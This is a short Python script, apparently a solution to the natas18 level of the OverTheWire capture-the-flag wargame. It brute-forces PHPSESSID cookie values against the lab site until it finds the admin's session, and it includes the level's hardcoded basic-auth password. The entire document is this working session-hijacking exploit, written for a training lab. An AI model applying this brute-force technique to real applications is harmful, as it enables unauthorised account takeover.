# exploit.

import requests
from requests.auth import HTTPBasicAuth

url = 'http://natas18.natas.labs.overthewire.org/index.php'
auth_info = HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
submit_data = {'username':'admin', 'password':'admin'}
max_id = 640
regular_user_string = 'You are logged in as a regular user.'

for cookie_number in range(0, max_id):
    print("[-] Trying PHPSESSID = " + str(cookie_number))
    cookie_value = 'PHPSESSID={0}'.format(cookie_number)
    r = requests.post(url, auth = auth_info, data = submit_data, headers = {'Cookie':cookie_value})
    if not regular_user_string in r.text:
        print("[*] You are logged in as admin.")
        print("[*] Response: \n" + str(r.text))
        break

        
